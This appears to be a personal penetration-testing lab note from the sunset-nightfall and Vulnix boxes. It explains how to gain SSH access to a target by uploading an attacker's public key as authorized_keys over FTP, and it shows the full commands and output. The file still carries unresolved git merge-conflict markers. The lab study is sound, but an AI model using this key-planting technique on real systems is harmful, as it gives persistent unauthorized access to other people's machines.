# Home Directory (Get SSH access)
Once you have access to FTP (or shell access) and you are in a home directory of a user, see if there are any .ssh directories. If not, create one
```
mkdir .ssh
```

On you Kali, generate a SSH public key if you have not already done so.
```
ssh-keygen
```

You can save it to whereever you want, in this case the working directory of our lab:
```
┌──(digit㉿kali)-[~/Documents/Labs/sunset-nightfall]
└─$ ssh-keygen
Generating public/private ed25519 key pair.
Enter file in which to save the key (/home/digit/.ssh/id_ed25519): /home/digit/Documents/Labs/sunset-nightfall/id_rsa
Enter passphrase for "/home/digit/Documents/Labs/sunset-nightfall/id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/digit/Documents/Labs/sunset-nightfall/id_rsa
Your public key has been saved in /home/digit/Documents/Labs/sunset-nightfall/id_rsa.pub
The key fingerprint is:
SHA256:aA2yn8n9eokDhtuRnEnZX92DX8xlhwtCKyC6n1YWye8 digit@kali
The key's randomart image is:
+--[ED25519 256]--+
|    . .  ..    . |
|   . o o  ... . +|
|  . . =o. .. o.*o|
|   . oo*..  ..o.=|
|  . .+=+S. .  . o|
|   ..BO=  .    . |
|    ++=oE. .     |
|   .. . o.o      |
|        .+.      |
+----[SHA256]-----+
```

Copy the public key to authorized_keys and upload to the target:
```
cp id_rsa.pub authorized_keys 
```

Now upload to FTP directory

```
put authorized_keys
```

Example Output:
```
ftp> put authorized_keys
local: authorized_keys remote: authorized_keys
229 Entering extended passive mode (|||55311|).
125 Data connection already open. Transfer starting.
100% |*****************************|   399        1.85 MiB/s    00:00 ETA
226 Transfer complete.
399 bytes sent in 00:00 (231.65 KiB/s)
ftp> 
```

Now SSH to the box using your private key:
```
ssh -i id_rsa matt@10.50.10.73
```

<<<<<<< Updated upstream
Sometimes, with older box that uses outdated SSH keys, you might need to specify some additional parameters like with the Vulnix Server:
```
ssh -o 'PubkeyAcceptedKeyTypes +ssh-rsa' -i /homr/vulnix.ssh.rsa vulnix@<targetIP>
```
=======
# Error: sign_and_send_pubkey: no mutual signature supported

To fix the above, do the following:
```
chmod 600 <sshKey>
echo "PubkeyAcceptedKeyTypes +ssh-rsa" >> ~/.ssh/config
```

>>>>>>> Stashed changes
